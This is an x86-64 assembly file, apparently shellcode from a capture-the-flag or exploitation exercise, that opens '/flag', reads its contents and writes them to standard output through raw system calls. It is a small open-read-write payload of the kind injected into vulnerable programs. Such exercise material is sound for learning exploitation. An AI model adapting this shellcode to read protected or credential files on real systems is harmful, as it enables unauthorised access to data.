.intel_syntax noprefix
.globl _start

.section .text
_start:

    #mov rax, 0x00000067616c662f
    #mov qword ptr [rip + 500], rax

    OPEN_FILE:
        xor rax, rax
        mov rax, 2
        lea rdi, [rip + flag_file]
        xor rsi, rsi
        syscall

    # Store the fd returned by open().
    mov rcx, rax

    READ_FILE:
        xor rax, rax
        mov rax, 0
        mov rdi, rcx
        lea rsi, [rip + flag]
        mov rdx, 100
        syscall

    # Store the number of bytes read.
    mov rcx, rax

    WRITE_FILE:
        xor rax, rax
        mov rax, 1
        mov rdi, 1
        lea rsi, [rip + flag]
        mov rdx, rcx
        syscall

    flag_file: .string "/flag"

    flag: .skip 1024
